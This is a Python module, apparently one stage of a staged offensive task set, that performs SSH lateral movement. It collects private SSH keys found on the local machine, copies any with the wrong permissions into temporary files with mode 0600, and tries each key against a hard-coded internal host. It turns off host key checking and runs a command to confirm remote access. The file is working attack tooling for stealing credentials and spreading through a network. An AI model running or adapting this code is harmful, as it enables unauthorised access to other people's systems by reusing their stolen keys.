from __future__ import annotations
from TASK_001_ssh_discovery import discover_ssh_private_keys, parse_known_hosts, SshKeyCandidate, KnownHostEntry

import getpass
import os
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, List, Optional, Tuple


__all__ = ["LateralMoveResult", "ssh_lateral_move"]

TARGET_HOST = "192.168.1.100"
REMOTE_COMMAND = "echo 'access confirmed'"
SUCCESS_MARKER = "access confirmed"


@dataclass
class LateralMoveResult:
    success: bool
    host: str
    remote_user: str
    key_path: Optional[str]
    stdout: str
    stderr: str
    returncode: int
    attempted_keys: List[str] = field(default_factory=list)


def _owned_by_current_user(path: Path) -> bool:
    try:
        stat = os.stat(path)
    except OSError:
        return False

    try:
        return stat.st_uid == os.getuid()
    except AttributeError:
        return False


def _current_user_writable(path: Path) -> bool:
    try:
        return os.access(path, os.W_OK)
    except OSError:
        return False


def _prepare_key(candidate: SshKeyCandidate) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    try:
        path = Path(candidate.path)
    except Exception as exc:
        return None, None, f"invalid private key path: {exc}"

    if not path.is_file():
        return None, None, f"private key path is not a file: {path}"

    if not os.access(path, os.R_OK):
        return None, None, f"private key is not readable: {path}"

    try:
        mode = os.stat(path).st_mode & 0o777
    except OSError:
        try:
            mode = int(getattr(candidate, "mode", 0) or 0) & 0o777
        except Exception:
            mode = 0

    if mode == 0o600:
        return str(path), None, None

    if _owned_by_current_user(path) or _current_user_writable(path):
        try:
            os.chmod(path, 0o600)
            return str(path), None, None
        except OSError:
            pass

    try:
        fd, tmp_path = tempfile.mkstemp(prefix="ssh_lateral_key_", suffix=".pem")
    except OSError as exc:
        return None, None, f"unable to create temporary key file: {exc}"

    try:
        with os.fdopen(fd, "wb") as dst:
            with open(path, "rb") as src:
                dst.write(src.read())
        os.chmod(tmp_path, 0o600)
        return tmp_path, tmp_path, None
    except Exception as exc:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
        return None, None, f"unable to stage private key with mode 0600: {exc}"


def _decode_output(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", "replace")
    return str(value)


def _run_ssh(key_path: str, remote_user: str) -> Tuple[str, str, int]:
    cmd = [
        "ssh",
        "-i",
        key_path,
        "-o",
        "IdentitiesOnly=yes",
        "-o",
        "BatchMode=yes",
        "-o",
        "PasswordAuthentication=no",
        "-o",
        "PubkeyAuthentication=yes",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-o",
        "ConnectTimeout=5",
        f"{remote_user}@{TARGET_HOST}",
        REMOTE_COMMAND,
    ]

    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=15,
        )
        return _decode_output(proc.stdout), _decode_output(proc.stderr), proc.returncode
    except subprocess.TimeoutExpired as exc:
        return _decode_output(exc.stdout), _decode_output(exc.stderr), -1
    except Exception as exc:
        return "", f"ssh invocation failed: {exc}", -1


def _resolve_remote_user() -> str:
    try:
        return getpass.getuser()
    except Exception:
        return os.environ.get("USER") or os.environ.get("LOGNAME") or "root"


def ssh_lateral_move() -> LateralMoveResult:
    remote_user = _resolve_remote_user()

    try:
        candidates = list(discover_ssh_private_keys() or [])
    except Exception as exc:
        candidates = []
        discovery_error = str(exc)
    else:
        discovery_error = None

    known_hosts: List[KnownHostEntry] = []
    try:
        known_hosts = parse_known_hosts() or []
    except Exception as exc:
        known_hosts_error = str(exc)
    else:
        known_hosts_error = None

    attempted_keys: List[str] = []
    errors: List[str] = []
    last_returncode = -1

    if discovery_error:
        errors.append(f"discover_ssh_private_keys failed: {discovery_error}")
    if known_hosts_error:
        errors.append(f"parse_known_hosts failed: {known_hosts_error}")

    if not candidates:
        stderr_text = "\n".join(errors) if errors else "No SSH private key candidates discovered."
        return LateralMoveResult(
            success=False,
            host=TARGET_HOST,
            remote_user=remote_user,
            key_path=None,
            stdout="",
            stderr=stderr_text,
            returncode=last_returncode,
            attempted_keys=attempted_keys,
        )

    for candidate in candidates:
        original_key = str(candidate.path)
        attempted_keys.append(original_key)
        temp_path: Optional[str] = None

        try:
            key_path, temp_path, prepare_error = _prepare_key(candidate)
            if prepare_error:
                errors.append(f"{original_key}: {prepare_error}")
                continue

            stdout, stderr, returncode = _run_ssh(key_path, remote_user)
            last_returncode = returncode

            if returncode == 0 and SUCCESS_MARKER in stdout:
                return LateralMoveResult(
                    success=True,
                    host=TARGET_HOST,
                    remote_user=remote_user,
                    key_path=key_path,
                    stdout=stdout,
                    stderr=stderr,
                    returncode=returncode,
                    attempted_keys=attempted_keys,
                )

            detail = (stderr or stdout or "no output").strip()
            errors.append(f"{original_key}: returncode={returncode}, detail={detail}")
        except Exception as exc:
            errors.append(f"{original_key}: unexpected error: {exc}")
        finally:
            if temp_path:
                try:
                    os.unlink(temp_path)
                except OSError:
                    pass

    stderr_text = "\n".join(errors) if errors else "No successful SSH lateral movement attempts."
    return LateralMoveResult(
        success=False,
        host=TARGET_HOST,
        remote_user=remote_user,
        key_path=None,
        stdout="",
        stderr=stderr_text,
        returncode=last_returncode,
        attempted_keys=attempted_keys,
    )
